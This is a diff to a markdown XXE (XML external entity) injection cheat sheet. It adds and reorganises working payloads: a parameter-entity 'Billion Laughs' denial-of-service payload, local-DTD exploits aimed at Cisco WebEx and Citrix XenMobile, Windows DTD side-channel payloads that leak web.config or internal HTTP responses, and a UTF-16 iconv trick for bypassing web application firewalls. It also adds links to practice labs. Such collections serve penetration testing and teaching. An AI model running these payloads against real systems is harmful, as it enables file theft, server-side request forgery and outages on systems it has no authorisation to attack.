@@ -11,6 +11,7 @@ Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
 ## Summary
 
 - [Tools](#tools)
+- [Labs](#labs)
 - [Detect the vulnerability](#detect-the-vulnerability)
 - [Exploiting XXE to retrieve files](#exploiting-xxe-to-retrieve-files)
   - [Classic XXE](#classic-xxe)
@@ -20,20 +21,23 @@ Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
 - [Exploiting XXE to perform SSRF attacks](#exploiting-xxe-to-perform-SSRF-attacks)
 - [Exploiting XXE to perform a deny of service](#exploiting-xxe-to-perform-a-deny-of-service)
   - [Billion Laugh Attack](#billion-laugh-attack)
-- [Error Based XXE](#error-based-xxe)
+  - [Yaml attack](#yaml-attack)
+  - [Parameters Laugh attack](#parameters-laugh-attack)
+- [Exploiting Error Based XXE](#exploiting-error-based-xxe)
 - [Exploiting blind XXE to exfiltrate data out-of-band](#exploiting-blind-xxe-to-exfiltrate-data-out-of-band)
   - [Blind XXE](#blind-xxe)
   - [XXE OOB Attack (Yunusov, 2013)](#xxe-oob-attack-yusonov---2013)
   - [XXE OOB with DTD and PHP filter](#xxe-oob-with-dtd-and-php-filter)
   - [XXE OOB with Apache Karaf](#xxe-oob-with-apache-karaf)
-- [Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents](#windows-local-dtd-and-side-channel-leak-to-disclose-http-responsefile-contents)
+- [WAF Bypasses](#waf-bypasses)
+  - [Bypass via character encoding](#bypass-via-character-encoding)
 - [XXE in exotic files](#xxe-in-exotic-files)
   - [XXE inside SVG](#xxe-inside-svg)
   - [XXE inside SOAP](#xxe-inside-soap)
   - [XXE inside DOCX file](#xxe-inside-docx-file)
   - [XXE inside XLSX file](#xxe-inside-xlsx-file)
   - [XXE inside DTD file](#xxe-inside-dtd-file)
-- [XXE WAF Bypass via convert character encoding](#xxe-waf-bypass-via-convert-character-encoding)
+- [Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents](#windows-local-dtd-and-side-channel-leak-to-disclose-http-responsefile-contents)
 
 ## Tools
 
@@ -87,6 +91,20 @@ Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
   python ./otori.py --clone --module "G-XXE-Basic" --singleuri "file:///etc/passwd" --module-options "TEMPLATEFILE" "TARGETURL" "BASE64ENCODE" "DOCTYPE" "XMLTAG" --outputbase "./output-generic-solr" --overwrite --noerrorfiles --noemptyfiles --nowhitespacefiles --noemptydirs 
   ```
 
+## Labs
+
+* [PortSwigger Labs for XXE](https://portswigger.net/web-security/all-labs#xml-external-entity-xxe-injection)
+  * [Exploiting XXE using external entities to retrieve files](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)
+  * [Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)
+  * [Blind XXE with out-of-band interaction](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)
+  * [Blind XXE with out-of-band interaction via XML parameter entities](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities)
+  * [Exploiting blind XXE to exfiltrate data using a malicious external DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)
+  * [Exploiting blind XXE to retrieve data via error messages](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages)
+  * [Exploiting XInclude to retrieve files](https://portswigger.net/web-security/xxe/lab-xinclude-attack)
+  * [Exploiting XXE via image file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)
+  * [Exploiting XXE to retrieve data by repurposing a local DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd)
+
+
 ## Detect the vulnerability
 
 Basic entity test, when the XML parser parses the external entities the result should contain "John" in `firstName` and "Doe" in `lastName`. Entities are defined inside the `DOCTYPE` element.
@@ -137,11 +155,9 @@ We try to display the content of the file `/etc/passwd`
 
 :warning: `SYSTEM` and `PUBLIC` are almost synonym.
 
-```xml
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [  
-  <!ELEMENT foo ANY >
-  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
+```ps1
+<!ENTITY % xxe PUBLIC "Random Text" "URL">
+<!ENTITY xxe PUBLIC "Any TEXT" "URL">
 ```
 
 ### Classic XXE Base64 encoded
@@ -182,6 +198,8 @@ When you can't modify the **DOCTYPE** element use the **XInclude** to target
 <foo xmlns:xi="http://www.w3.org/2001/XInclude">
 <xi:include parse="text" href="file:///etc/passwd"/></foo>
 ```
+
+
 
 ## Exploiting XXE to perform SSRF attacks
 
@@ -228,8 +246,22 @@ h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
 i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
 ```
 
+### Parameters Laugh attack
 
-## Error Based XXE
+A variant of the Billion Laughs attack, using delayed interpretation of parameter entities, by Sebastian Pipping.
+
+```xml
+<!DOCTYPE r [
+  <!ENTITY % pe_1 "<!---->">
+  <!ENTITY % pe_2 "&#37;pe_1;<!---->&#37;pe_1;">
+  <!ENTITY % pe_3 "&#37;pe_2;<!---->&#37;pe_2;">
+  <!ENTITY % pe_4 "&#37;pe_3;<!---->&#37;pe_3;">
+  %pe_4;
+]>
+<r/>
+```
+
+## Exploiting Error Based XXE
 
 **Payload to trigger the XXE**
 
@@ -243,6 +275,7 @@ i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
 ```
 
 **Contents of ext.dtd**
+
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
@@ -252,13 +285,11 @@ i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
 
 
 
-
-
 ## Exploiting blind XXE to exfiltrate data out-of-band
 
 Sometimes you won't have a result outputted in the page but you can still extract the data with an out of band attack.
 
-### Blind XXE
+### Basic Blind XXE
 
 The easiest way to test for a blind XXE is to try to load a remote resource such as a Burp Collaborator.
 
@@ -372,46 +403,46 @@ Assuming payloads such as the previous return a verbose error. You can start poi
 ]>
 <root></root>
 ```
-
+### Cisco WebEx
+```
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd">
+<!ENTITY % url.attribute.set '>Your DTD code<!ENTITY test "test"'>
+%local_dtd;
+```
+### Citrix XenMobile Server
+```
+<!ENTITY % local_dtd SYSTEM "jar:file:///opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd">
+<!ENTITY % Body '>Your DTD code<!ENTITY test "test"'>
+%local_dtd;
+```
 [Other payloads using different DTDs](https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md)
 
 
+## WAF Bypasses 
 
-## Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents
+### Bypass via character encoding
 
-From https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79
+XML parsers uses 4 methods to detect encoding:
+* HTTP Content Type: `Content-Type: text/xml; charset=utf-8`
+* Reading Byte Order Mark (BOM)
+* Reading first symbols of document 
+    * UTF-8 (3C 3F 78 6D)
+    * UTF-16BE (00 3C 00 3F)
+    * UTF-16LE (3C 00 3F 00)
+* XML declaration: `<?xml version="1.0" encoding="UTF-8"?>`
 
-### Disclose local file
+| Encoding | BOM      | Example                             |              |
+|----------|----------|-------------------------------------|--------------|
+| UTF-8    | EF BB BF | EF BB BF 3C 3F 78 6D 6C             | ...<?xml     |
+| UTF-16BE | FE FF    | FE FF 00 3C 00 3F 00 78 00 6D 00 6C | ...<.?.x.m.l |
+| UTF-16LE | FF FE    | FF FE 3C 00 3F 00 78 00 6D 00 6C 00 | ..<.?.x.m.l. |
 
-```xml
-<!DOCTYPE doc [
-    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
-    <!ENTITY % SuperClass '>
-        <!ENTITY &#x25; file SYSTEM "file://D:\webserv2\services\web.config">
-        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>">
-        &#x25;eval;
-        &#x25;error;
-      <!ENTITY test "test"'
-    >
-    %local_dtd;
-  ]><xxx>cacat</xxx>
+**Example**: We can convert the payload to `UTF-16` using [iconv](https://man7.org/linux/man-pages/man1/iconv.1.html) to bypass some WAF:
+
+```bash
+cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml
 ```
 
-### Disclose HTTP Response:
-
-```xml
-<!DOCTYPE doc [
-    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
-    <!ENTITY % SuperClass '>
-        <!ENTITY &#x25; file SYSTEM "https://erp.company.com">
-        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://test/#&#x25;file;&#x27;>">
-        &#x25;eval;
-        &#x25;error;
-      <!ENTITY test "test"'
-    >
-    %local_dtd;
-  ]><xxx>cacat</xxx>
-```
 
 ## XXE in exotic files
 
@@ -581,21 +612,47 @@ When all you control is the DTD file, and you do not control the `xml` file, XXE
 %external;
 ```
 
-### XXE WAF Bypass via convert character encoding
 
-In XXE WAFs, DTD Prolog are usually blacklisted BUT not all WAFs blacklist the UTF-16 character encoding<br><br>
-`All XML processors must accept the UTF-8 and UTF-16 encodings of Unicode` 
--- https://www.w3.org/XML/xml-V10-4e-errata#E11
-<br><br>
-we can convert the character encoding to `UTF-16` using [iconv](https://man7.org/linux/man-pages/man1/iconv.1.html) to bypass the XXE WAF:-<br>
-```bash
-cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml
+## Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents
+
+From https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79
+
+### Disclose local file
+
+```xml
+<!DOCTYPE doc [
+    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
+    <!ENTITY % SuperClass '>
+        <!ENTITY &#x25; file SYSTEM "file://D:\webserv2\services\web.config">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+      <!ENTITY test "test"'
+    >
+    %local_dtd;
+  ]><xxx>cacat</xxx>
 ```
 
+### Disclose HTTP Response:
+
+```xml
+<!DOCTYPE doc [
+    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
+    <!ENTITY % SuperClass '>
+        <!ENTITY &#x25; file SYSTEM "https://erp.company.com">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://test/#&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+      <!ENTITY test "test"'
+    >
+    %local_dtd;
+  ]><xxx>cacat</xxx>
+```
 
 ## References
 
 * [XML External Entity (XXE) Processing - OWASP](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)
+* [XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
 * [Detecting and exploiting XXE in SAML Interfaces](http://web-in-security.blogspot.fr/2014/11/detecting-and-exploiting-xxe-in-saml.html) - 6. Nov. 2014 - Von Christian Mainka
 * [[Gist] staaldraad - XXE payloads](https://gist.github.com/staaldraad/01415b990939494879b4)
 * [[Gist] mgeeky - XML attacks](https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870)
@@ -616,3 +673,6 @@ cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml
 * [Midnight Sun CTF 2019 Quals - Rubenscube](https://jbz.team/midnightsunctfquals2019/Rubenscube)
 * [SynAck - A Deep Dive into XXE Injection](https://www.synack.com/blog/a-deep-dive-into-xxe-injection/) - 22 July 2019 - Trenton Gordon
 * [Synacktiv - CVE-2019-8986: SOAP XXE in TIBCO JasperReports Server](https://www.synacktiv.com/ressources/advisories/TIBCO_JasperReports_Server_XXE.pdf) - 11-03-2019 - Julien SZLAMOWICZ, Sebastien DUDEK
+* [XXE: How to become a Jedi](https://2017.zeronights.org/wp-content/uploads/materials/ZN17_yarbabin_XXE_Jedi_Babin.pdf) - Zeronights 2017 - Yaroslav Babin
+* [Payloads for Cisco and Citrix - Arseniy Sharoglazov](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
+
